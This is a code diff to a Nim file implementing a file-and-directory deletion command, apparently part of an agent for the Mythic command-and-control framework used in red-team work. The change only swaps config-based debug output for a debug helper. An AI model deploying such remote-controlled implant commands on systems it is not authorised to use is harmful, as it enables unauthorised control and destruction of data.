@@ -2,13 +2,11 @@
 ## Deletes files or directories from the filesystem
 
 import std/[json, os, strformat, strutils]
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 
 proc rm*(taskId: string, params: JsonNode): JsonNode =
   ## Remove (delete) a file or directory
-  let cfg = getConfig()
-  
   try:
     # Parse parameters
     let pathParam = params["path"].getStr()
@@ -25,8 +23,7 @@ proc rm*(taskId: string, params: JsonNode): JsonNode =
     else:
       getCurrentDir() / pathParam
     
-    if cfg.debug:
-      echo &"[DEBUG] Removing: {path}"
+    debug &"[DEBUG] Removing: {path}"
     
     # Check if path exists
     if not fileExists(path) and not dirExists(path):
